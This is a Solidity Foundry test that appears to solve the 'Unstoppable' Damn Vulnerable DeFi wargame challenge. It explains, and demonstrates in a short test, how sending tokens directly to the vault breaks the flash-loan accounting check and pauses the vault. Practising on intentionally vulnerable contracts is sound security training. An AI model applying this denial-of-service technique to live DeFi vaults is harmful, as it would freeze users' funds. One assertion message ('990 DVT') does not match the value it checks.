// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {UnstoppableVault} from "../src/UnstoppableVault.sol";
import {UnstoppableMonitor} from "../src/UnstoppableMonitor.sol";
import {ERC20} from "@solmate/src/tokens/ERC4626.sol";

/**
 * @title UnstoppableVault Asset-Share Discrepancy Vulnerability Demonstration
 * @notice Demonstrates the potential risks associated with direct token transfers to the UnstoppableVault contract, leading to discrepancies between the actual token balance and the accounted shares.
 *
 * @dev The vulnerability exists because:
 * - Direct token transfers to the vault do not result in a corresponding increase in the number of shares. This creates a discrepancy between the total assets reported by `totalAssets()` and the actual token balance of the vault.
 * - The `flashLoan` function performs a check before and after the loan to ensure that the total assets before the transaction match the sum of the returned assets and fees. If there is a discrepancy due to an unaccounted direct transfer, this check will fail.
 *
 * Attack flow:
 * 1. An external entity or the owner directly transfers tokens to the vault's address without using the `deposit` function, which properly accounts for shares.
 * 2. This unaccounted increase in the vault's balance leads to a mismatch between the actual token balance and the shares accounted for by the vault.
 * 3. When a `flashLoan` is executed, the pre and post asset checks fail due to this discrepancy, potentially causing the function to revert or triggering unintended behavior such as automatic pausing of the vault if designed to handle such discrepancies as a critical failure.
 * 4. This can be exploited to manipulate the state of the vault, potentially leading to denial of service or other malicious outcomes.
 */
contract DVTToken is ERC20 {
    constructor(address owner, uint256 initialSupply) ERC20("Too Damn Valuable Token", "DVT", 18) {
        _mint(owner, initialSupply);
    }
}

contract UnstoppableTest is Test {
    UnstoppableVault public vault;
    UnstoppableMonitor public monitor;

    uint256 public constant DVT_INITIAL_SUPPLY = 1_000_010e18;
    DVTToken public dvt;

    address public OWNER = makeAddr("OWNER");
    address public FEE_RECIPIENT = makeAddr("FEE_RECIPIENT");

    function setUp() public {
        OWNER = makeAddr("OWNER");
        FEE_RECIPIENT = makeAddr("FEE_RECIPIENT");

        dvt = new DVTToken(OWNER, DVT_INITIAL_SUPPLY);
        vault = new UnstoppableVault(dvt, OWNER, FEE_RECIPIENT);
        monitor = new UnstoppableMonitor(address(vault));

        vm.startPrank(OWNER);
        dvt.approve(address(vault), 1_000_000e18);
        vault.deposit(1_000_000e18, OWNER);
        dvt.transfer(address(this), 10e18);
        vault.transferOwnership(address(monitor));
        vm.stopPrank();
    }

    function testCheckFlashLoan() public {
        uint256 balance = dvt.balanceOf(address(this));
        uint256 balanceVault = dvt.balanceOf(address(vault));

        uint256 ASSET_TOTAL_VAULT = vault.totalAssets() / 1e18;
        uint256 OWNER_SHARES = vault.balanceOf(OWNER) / 1e18;

        console.log("--------------------------------");
        console.log("ASSET_TOTAL_VAULT", ASSET_TOTAL_VAULT);
        console.log("OWNER_SHARES", OWNER_SHARES);
        console.log("--------------------------------");

        assertEq(balance, 10e18, "Address this should have 10 DVT");
        assertEq(balanceVault, DVT_INITIAL_SUPPLY - 10e18, "Vault should have 990 DVT");

        dvt.transfer(address(vault), 5e18);
        monitor.checkFlashLoan(1);
        assertEq(vault.paused(), true, "DVT should be paused");

        monitor.checkFlashLoan(1);
    }
}
